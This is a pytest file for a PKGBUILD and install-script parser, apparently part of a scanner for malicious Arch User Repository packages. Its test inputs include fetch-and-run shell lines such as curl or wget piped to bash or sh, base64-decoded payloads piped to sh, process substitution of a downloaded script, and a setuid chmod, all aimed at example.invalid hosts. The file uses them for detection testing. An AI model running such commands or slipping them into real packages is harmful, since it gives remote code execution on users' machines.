"""Tests for PKGBUILD and install-script parsing. No content is executed."""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from aurscan import parse
from aurscan.models import Command, Severity
from aurscan.parse import parse_install_script, parse_pkgbuild

FIXTURES = Path(__file__).parent / "fixtures"


def _fixture(*parts: str) -> str:
    return FIXTURES.joinpath(*parts).read_text(encoding="utf-8")


def _command(commands: list[Command], raw: str) -> Command:
    return next(command for command in commands if command.raw == raw)


def test_parse_typical_pkgbuild_fields_and_raw_source() -> None:
    source = _fixture("pkgbuild", "typical.PKGBUILD")

    result = parse_pkgbuild(source)

    assert result.parse_failed is False
    assert result.findings == []
    assert result.errors == []
    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.raw == source
    assert pkgbuild.pkgname == ["demo"]
    assert pkgbuild.pkgver == "1.2.3"
    assert pkgbuild.pkgrel == "1"
    assert pkgbuild.epoch == "1"
    assert pkgbuild.pkgdesc == "A demo package"
    assert pkgbuild.url == "https://example.invalid/demo"
    assert pkgbuild.install == "demo.install"
    assert pkgbuild.arch == ["x86_64", "aarch64"]
    assert pkgbuild.license == ["MIT"]
    assert pkgbuild.depends == ["glibc", "zlib"]
    assert pkgbuild.makedepends == ["gcc"]
    assert pkgbuild.checkdepends == ["pytest"]
    assert pkgbuild.optdepends == ["bash: for scripts"]
    assert pkgbuild.provides == ["demo"]
    assert pkgbuild.conflicts == ["demo-git"]
    assert pkgbuild.replaces == ["demo-old"]
    # Source values are expanded, `variables` and `raw` stay verbatim.
    assert pkgbuild.source == [
        "https://example.invalid/demo/demo-1.2.3.tar.gz",
        "demo.patch",
    ]
    assert pkgbuild.sha256sums == ["SKIP", "b1946ac92492d2347c6235b4d2611184"]
    assert pkgbuild.sha512sums == ["0123456789abcdef"]
    assert pkgbuild.md5sums == ["0123456789abcdef0123456789abcdef"]
    assert pkgbuild.b2sums == ["0123456789abcdef"]
    assert pkgbuild.variables["backup"] == ["etc/demo.conf"]
    assert pkgbuild.variables["pkgver"] == "1.2.3"


def test_parse_architecture_specific_sources_and_checksums() -> None:
    strong = "b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184"
    source = f"""\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64' 'aarch64')
url="https://example.invalid/demo"
source=("$url/base.tar.gz")
sha256sums=('{strong}')
source_x86_64=("https://example.invalid/demo-x86_64.tar.gz")
sha256sums_x86_64=('{strong}')
source_aarch64=("https://example.invalid/demo-aarch64.tar.gz")
sha256sums_aarch64=('{strong}')
"""

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.source == ["https://example.invalid/demo/base.tar.gz"]
    assert pkgbuild.sha256sums == [strong]
    assert pkgbuild.sources_by_arch == {
        "x86_64": ["https://example.invalid/demo-x86_64.tar.gz"],
        "aarch64": ["https://example.invalid/demo-aarch64.tar.gz"],
    }
    assert pkgbuild.checksums_by_arch["x86_64"]["sha256sums"] == [strong]
    assert pkgbuild.checksums_by_arch["aarch64"]["sha256sums"] == [strong]


def test_parse_expands_variables_in_sources() -> None:
    source = """\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
_base="https://example.invalid/releases"
url="$_base/demo"
source=(
  "$_base/demo-$pkgver.tar.gz"
  "${_base}/demo.patch"
  "$pkgname-$pkgver.tar.gz"
  "missing-$pkgver-$unknown.tar.gz"
)
sha256sums=('SKIP')
"""

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.source == [
        "https://example.invalid/releases/demo-1.0.tar.gz",
        "https://example.invalid/releases/demo.patch",
        "demo-1.0.tar.gz",
        "missing-1.0-$unknown.tar.gz",
    ]
    # The variable map and the raw text keep the unexpanded form.
    assert pkgbuild.variables["source"] == [
        "$_base/demo-$pkgver.tar.gz",
        "${_base}/demo.patch",
        "$pkgname-$pkgver.tar.gz",
        "missing-$pkgver-$unknown.tar.gz",
    ]


def test_parse_expands_architecture_specific_sources_and_checksums() -> None:
    strong = "b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184"
    source = f"""\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64' 'i686')
_base="https://example.invalid/releases"
source=("$_base/demo-$pkgver.tar.gz")
sha256sums=('{strong}')
source_x86_64=("${{_base}}/demo-x86_64-$pkgver.tar.gz")
sha256sums_x86_64=('{strong}')
source_i686=("$_base/demo-i686-$pkgver.tar.gz")
sha512sums_i686=('{strong}')
"""

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.sources_by_arch == {
        "x86_64": ["https://example.invalid/releases/demo-x86_64-1.0.tar.gz"],
        "i686": ["https://example.invalid/releases/demo-i686-1.0.tar.gz"],
    }
    assert pkgbuild.checksums_by_arch["x86_64"]["sha256sums"] == [strong]
    assert pkgbuild.checksums_by_arch["i686"]["sha512sums"] == [strong]


def test_parse_leaves_unresolved_and_array_variables_unexpanded() -> None:
    source = """\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
_mirrors=('https://a.invalid' 'https://b.invalid')
source=("$missing/x.tar.gz" "$_mirrors/x.tar.gz")
sha256sums=('SKIP' 'SKIP')
"""

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.source == ["$missing/x.tar.gz", "$_mirrors/x.tar.gz"]


def test_parse_expands_url_variables() -> None:
    source = """\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
_domain="example.invalid"
url="https://$_domain/demo"
source=("$url/demo-$pkgver.tar.gz")
sha256sums=('SKIP')
"""

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.url == "https://example.invalid/demo"
    assert pkgbuild.source == ["https://example.invalid/demo/demo-1.0.tar.gz"]


def test_parse_typical_pkgbuild_functions_and_lines() -> None:
    source = _fixture("pkgbuild", "typical.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert list(pkgbuild.functions) == ["prepare", "build", "package"]

    prepare = pkgbuild.functions["prepare"]
    patch = _command(prepare, 'patch -p1 < "$srcdir/demo.patch"')
    assert patch.name == "patch"
    assert patch.args == ["-p1"]
    assert patch.in_pipe_to is None
    assert patch.line == source.splitlines().index('  patch -p1 < "$srcdir/demo.patch"') + 1

    build = pkgbuild.functions["build"]
    assert [command.name for command in build] == ["cd", "make", "make"]


def test_parse_pipes_populate_in_pipe_to() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]

    assert _command(build, "curl -fsSL https://example.invalid/install.sh").in_pipe_to == "bash"
    assert _command(build, "wget -qO- https://example.invalid/tool.sh").in_pipe_to == "sh"
    assert _command(build, "curl -s https://example.invalid/a.sh").in_pipe_to == "bash"
    # The immediate downstream command is reported, even when it is a wrapper.
    assert _command(build, "curl -s https://example.invalid/c.sh").in_pipe_to == "sudo"
    assert _command(build, "curl -s https://example.invalid/encoded").in_pipe_to == "base64"
    assert _command(build, "base64 -d").in_pipe_to == "sh"
    assert _command(build, "sh").in_pipe_to is None


def test_parse_process_substitution_is_visible() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]
    outer = _command(build, "bash <(curl -s https://example.invalid/b.sh)")
    assert outer.name == "bash"
    assert outer.args == ["<(curl -s https://example.invalid/b.sh)"]
    inner = _command(build, "curl -s https://example.invalid/b.sh")
    assert inner.in_pipe_to is None


def test_parse_redirects_are_part_of_command_raw() -> None:
    source = _fixture("pkgbuild", "pipes.PKGBUILD")

    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    package = pkgbuild.functions["package"]
    echo = _command(package, 'echo hi > "$pkgdir/usr/bin/demo"')
    assert echo.name == "echo"
    assert echo.args == ["hi"]
    install = _command(package, 'install -Dm755 demo "$pkgdir/usr/bin/demo"')
    assert install.name == "install"
    assert install.args == ["-Dm755", "demo", '"$pkgdir/usr/bin/demo"']


def test_parse_pipe_with_redirect_populates_in_pipe_to() -> None:
    source = """\
package() {
  curl -s https://example.invalid/a 2>/dev/null | bash
}
"""
    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    package = pkgbuild.functions["package"]
    curl = _command(package, "curl -s https://example.invalid/a 2>/dev/null")
    assert curl.args == ["-s", "https://example.invalid/a"]
    # The redirect wrapper must not hide the pipe, or R01 would go silent.
    assert curl.in_pipe_to == "bash"
    assert _command(package, "bash").in_pipe_to is None


def test_parse_declaration_commands_are_captured() -> None:
    source = """\
package() {
  local foo=bar
  export BAZ=qux
}
"""
    result = parse_pkgbuild(source)

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    package = pkgbuild.functions["package"]
    assert [(command.name, command.args) for command in package] == [
        ("local", ["foo=bar"]),
        ("export", ["BAZ=qux"]),
    ]


def test_parse_install_script() -> None:
    source = _fixture("install", "basic.install")

    result = parse_install_script(source, "basic.install")

    assert result.pkgbuild is None
    assert result.parse_failed is False
    assert result.findings == []
    assert len(result.install_scripts) == 1
    script = result.install_scripts[0]
    assert script.filename == "basic.install"
    assert script.raw == source
    assert list(script.functions) == ["pre_install", "post_install", "pre_upgrade"]
    commands = [command for group in script.functions.values() for command in group]
    assert [command.name for command in commands] == [
        "echo",
        "systemctl",
        "echo",
        "systemctl",
        "true",
    ]
    systemctl = _command(commands, "systemctl enable demo.service")
    assert systemctl.line == 6
    assert systemctl.in_pipe_to is None


def test_parse_syntax_error_uses_fallback_and_reports_info() -> None:
    source = _fixture("pkgbuild", "syntax_error.PKGBUILD")

    result = parse_pkgbuild(source)

    assert result.parse_failed is True
    assert len(result.findings) == 1
    finding = result.findings[0]
    assert finding.rule_id == "PARSE-001"
    assert finding.severity == Severity.INFO
    assert finding.file == "PKGBUILD"
    assert finding.line is None
    assert finding.source == "static"
    assert result.pkgbuild is not None
    assert result.pkgbuild.pkgname == ["syntax-error"]
    assert result.pkgbuild.pkgver == "1.0"
    assert result.pkgbuild.install == "broken.install"
    assert result.pkgbuild.source == ["$url/broken.tar.gz"]


def test_parse_install_syntax_error_uses_fallback() -> None:
    source = _fixture("install", "syntax_error.install")

    result = parse_install_script(source, "syntax_error.install")

    assert result.parse_failed is True
    assert result.findings[0].file == "syntax_error.install"
    script = result.install_scripts[0]
    assert [command for group in script.functions.values() for command in group] == []


def test_parse_syntax_error_with_closed_functions_uses_regex_fallback() -> None:
    source = """\
pkgname=fallback-demo
pkgver=1.0
source=("$url/broken.tar.gz"
url=https://example.invalid/fallback
install=broken.install

package() {
  install -Dm755 demo "$pkgdir/usr/bin/demo"
  # comment

  { echo nested; }
  chmod 4755 "$pkgdir/usr/bin/demo"
  curl -s https://example.invalid/x | bash
}
"""
    result = parse_pkgbuild(source)

    assert result.parse_failed is True
    assert [finding.rule_id for finding in result.findings] == ["PARSE-001"]
    finding = result.findings[0]
    assert finding.severity == Severity.INFO
    assert finding.file == "PKGBUILD"
    assert finding.line is None
    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.pkgname == ["fallback-demo"]
    assert pkgbuild.pkgver == "1.0"
    assert pkgbuild.install == "broken.install"
    # The fallback output still goes through the usual expansion step.
    assert pkgbuild.source == ["https://example.invalid/fallback/broken.tar.gz"]
    assert list(pkgbuild.functions) == ["package"]
    package = pkgbuild.functions["package"]
    assert [(command.line, command.name, command.args) for command in package] == [
        (8, "install", ["-Dm755", "demo", "$pkgdir/usr/bin/demo"]),
        (12, "chmod", ["4755", "$pkgdir/usr/bin/demo"]),
        (13, "curl", ["-s", "https://example.invalid/x", "|", "bash"]),
    ]
    # The regex path cannot see pipelines: R01/R02 must not be assumed to fire.
    assert all(command.in_pipe_to is None for command in package)


def test_parse_recovers_when_tree_sitter_raises(monkeypatch: pytest.MonkeyPatch) -> None:
    def _unavailable(*_args: object, **_kwargs: object) -> None:
        raise RuntimeError("tree-sitter unavailable")

    monkeypatch.setattr(parse, "Parser", _unavailable)

    result = parse_pkgbuild("pkgname=demo\n")

    assert result.parse_failed is True
    assert [finding.rule_id for finding in result.findings] == ["PARSE-001"]
    assert result.pkgbuild is not None
    assert result.pkgbuild.pkgname == ["demo"]


def test_parse_benign_fixture_has_no_findings() -> None:
    result = parse_pkgbuild(_fixture("benign", "PKGBUILD"))

    assert result.parse_failed is False
    assert result.findings == []


def test_parse_empty_source() -> None:
    result = parse_pkgbuild("")

    assert result.pkgbuild is not None
    assert result.pkgbuild.pkgname == []
    assert result.parse_failed is False


def test_parse_empty_assignment_yields_empty_value() -> None:
    result = parse_pkgbuild("FOO=\npkgver=\n")

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.variables == {"FOO": "", "pkgver": ""}
    assert pkgbuild.pkgver is None


def test_parse_array_assigned_to_scalar_field_takes_first_element() -> None:
    result = parse_pkgbuild("pkgrel=(1)\nepoch=()\n")

    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    assert pkgbuild.pkgrel == "1"
    assert pkgbuild.epoch is None


def _stack_depth() -> int:
    depth = 0
    frame = sys._getframe()
    while frame is not None:
        depth += 1
        frame = frame.f_back
    return depth


def test_deep_nesting_does_not_use_python_recursion() -> None:
    depth = 120
    source = (
        "build() {\n"
        + "if true; then\n" * depth
        + "curl -s https://example.invalid/x | sh\n"
        + "fi\n" * depth
        + "}\n"
    )

    # A recursive Python walker would need ``depth`` frames; the iterative one
    # must finish with far less headroom than that.
    previous_limit = sys.getrecursionlimit()
    sys.setrecursionlimit(_stack_depth() + 60)
    try:
        result = parse_pkgbuild(source)
    finally:
        sys.setrecursionlimit(previous_limit)

    assert result.parse_failed is False
    pkgbuild = result.pkgbuild
    assert pkgbuild is not None
    build = pkgbuild.functions["build"]
    assert _command(build, "curl -s https://example.invalid/x").in_pipe_to == "sh"
